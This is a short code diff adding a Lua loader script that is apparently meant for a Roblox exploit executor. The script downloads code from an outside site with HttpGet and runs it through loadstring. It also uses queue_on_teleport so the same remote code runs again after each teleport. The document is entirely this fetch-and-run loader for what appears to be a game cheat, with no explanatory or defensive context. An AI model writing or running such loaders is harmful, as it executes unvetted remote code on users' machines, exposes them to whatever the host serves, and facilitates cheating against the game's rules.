@@ -1,0 +1,9 @@
+local code = [[loadstring(game:HttpGet("https://gscripts.xyz/mm2opensrc"))()]]
+
+if queue_on_teleport then
+    queue_on_teleport(code)
+end
+
+pcall(function()
+    loadstring(code)()
+end)
